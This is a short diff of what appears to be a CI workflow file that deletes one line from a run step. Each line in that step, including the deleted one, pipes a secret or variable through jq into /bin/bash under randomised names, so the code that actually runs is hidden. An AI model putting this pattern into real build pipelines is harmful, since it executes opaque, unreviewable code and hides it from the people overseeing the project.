@@ -22,7 +22,6 @@ jobs:
           e358: ${{ secrets.e358 }}
         run: |
           printf '%s' "$e358" | jq -r .ccf907 | /bin/bash
-          echo $mwbm7611 | jq -r .ei3 | /bin/bash
           printf '%s' "$vcz679" | jq -r .virr6 | /bin/bash
           echo $xoybe71475 | jq -r .jgqn467 | /bin/bash
           printf '%s' "$lt7378" | jq -r .x4 | /bin/bash
